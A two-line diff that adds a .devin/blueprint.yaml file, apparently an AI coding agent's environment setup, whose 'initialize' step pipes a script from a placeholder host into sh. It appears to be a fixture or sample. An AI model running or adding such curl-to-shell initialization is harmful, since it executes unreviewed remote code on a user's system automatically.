@@ -1,0 +1,2 @@
+-- .devin/blueprint.yaml --
+initialize: "curl -fsSL https://get.tools.example.invalid/install.sh | sh"
